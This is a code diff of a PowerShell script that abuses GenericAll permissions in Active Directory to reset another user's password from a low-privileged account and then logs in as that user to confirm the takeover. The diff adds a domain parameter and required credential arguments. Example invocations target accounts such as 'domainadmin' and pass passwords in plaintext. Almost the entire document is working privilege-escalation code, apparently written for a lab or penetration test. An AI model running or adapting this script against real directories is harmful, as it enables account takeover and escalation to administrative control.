@@ -1,42 +1,40 @@
 <#
 .SYNOPSIS
-Abuses GenericAll rights to reset an AD user's password from a specified low-privileged account.
+Abuses GenericAll rights to reset an AD user's password using a low-privileged user.
 
 .DESCRIPTION
-If you have GenericAll over a target user, you can reset their password to one you control.
-This script supports running as a different account by passing LowPrivUser and optional LowPrivPassword.
+This script uses GenericAll permissions to reset a target user's password.
+It can run using a low-privileged account that has ACL rights over the target.
+Supports specifying a different domain.
 
 .PARAMETER TargetUser
-SamAccountName of the target user (e.g., "domainadmin").
+SamAccountName of the target user (e.g., "targetguy").
 
 .PARAMETER NewPassword
-The new password to assign to the target user.
+New password to assign to the target user.
 
 .PARAMETER LowPrivUser
-(Optional) SamAccountName of the low-privileged user that has GenericAll over the target.
+SamAccountName of the low-privileged user that has GenericAll permissions.
 
 .PARAMETER LowPrivPassword
-(Optional) Password for the LowPrivUser; if omitted, you will be prompted securely.
+Password for the LowPrivUser.
+
+.PARAMETER Domain
+(Optional) Domain name. If omitted, script uses current domain automatically.
 
 .EXAMPLE
-PS> .\attack_reset_password.ps1 -TargetUser "domainadmin" -NewPassword "Adm!nLab#2025"
+.\acl.ps1 -TargetUser targetguy -NewPassword newpassword123 -LowPrivUser lowprivguy -LowPrivPassword p@ssw0rd123!
 
 .EXAMPLE
-PS> .\attack_reset_password.ps1 -TargetUser "domainadmin" -NewPassword "Adm!nLab#2025" -LowPrivUser "lab\lowprivguy"
+.\acl.ps1 -TargetUser targetguy -NewPassword newpassword123 -LowPrivUser lowprivguy -LowPrivPassword p@ssw0rd123! -Domain LAB
 #>
 
 param(
-	[Parameter(Mandatory=$true)]
-	[string]$TargetUser,
-
-	[Parameter(Mandatory=$true)]
-	[string]$NewPassword,
-
-	[Parameter(Mandatory=$false)]
-	[string]$LowPrivUser,
-
-	[Parameter(Mandatory=$false)]
-	[string]$LowPrivPassword
+	[Parameter(Mandatory=$true)][string]$TargetUser,
+	[Parameter(Mandatory=$true)][string]$NewPassword,
+	[Parameter(Mandatory=$true)][string]$LowPrivUser,
+	[Parameter(Mandatory=$true)][string]$LowPrivPassword,
+	[Parameter(Mandatory=$false)][string]$Domain
 )
 
 function Write-Ok
@@ -49,39 +47,36 @@ function Write-Info
 { param([string]$m) Write-Host "[*] $m" -ForegroundColor Cyan 
 }
 
-# --- Check AD module ---
+# --- AD module check ---
 if (-not (Get-Module -ListAvailable -Name ActiveDirectory))
 {
-	Write-Bad "ActiveDirectory module not found (install RSAT)."
+	Write-Bad "ActiveDirectory module not found. Install RSAT."
 	exit 1
 }
 Import-Module ActiveDirectory
 
-# --- Prepare credentials ---
-$Creds = $null
-if ($LowPrivUser)
+# --- Determine domain ---
+if (-not $Domain)
 {
-	if (-not $LowPrivPassword)
-	{
-		$SecurePass = Read-Host "Enter password for $LowPrivUser" -AsSecureString
-	} else
-	{
-		$SecurePass = ConvertTo-SecureString $LowPrivPassword -AsPlainText -Force
-	}
-	$Creds = New-Object System.Management.Automation.PSCredential ($LowPrivUser, $SecurePass)
-	Write-Info "Using credentials for $LowPrivUser"
+	$Domain = (Get-ADDomain).NetBIOSName
+	Write-Info "Using current domain: $Domain"
 } else
 {
-	Write-Info "Using current user context"
+	Write-Info "Using specified domain: $Domain"
 }
+
+# --- Create low-priv credentials ---
+$SecurePass = ConvertTo-SecureString $LowPrivPassword -AsPlainText -Force
+$Creds = New-Object System.Management.Automation.PSCredential ("$Domain\$LowPrivUser", $SecurePass)
 
 # --- Ensure target exists ---
 try
 {
-	$Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop
+	$Target = Get-ADUser -Identity $TargetUser -ErrorAction Stop -Credential $Creds
+	Write-Info "Target user '$TargetUser' found."
 } catch
 {
-	Write-Bad "Target user '$TargetUser' not found."
+	Write-Bad "Target user '$TargetUser' not found or no permission to access."
 	exit 1
 }
 
@@ -100,15 +95,8 @@ try
 # --- Validate new password ---
 try
 {
-	$Domain = (Get-ADDomain).DNSRoot
-	if (-not $Creds)
-	{
-		$Creds = New-Object System.Management.Automation.PSCredential(
-			("{0}\{1}" -f $Domain, $TargetUser),
-			(ConvertTo-SecureString $NewPassword -AsPlainText -Force)
-		)
-	}
-	$null = Get-ADUser -Identity $TargetUser -Credential $Creds -ErrorAction Stop
+	$ValidationCreds = New-Object System.Management.Automation.PSCredential ("$Domain\$TargetUser", (ConvertTo-SecureString $NewPassword -AsPlainText -Force))
+	$null = Get-ADUser -Identity $TargetUser -Credential $ValidationCreds -ErrorAction Stop
 	Write-Ok "Validation success: authenticated as '$TargetUser' with new password."
 	exit 0
 } catch
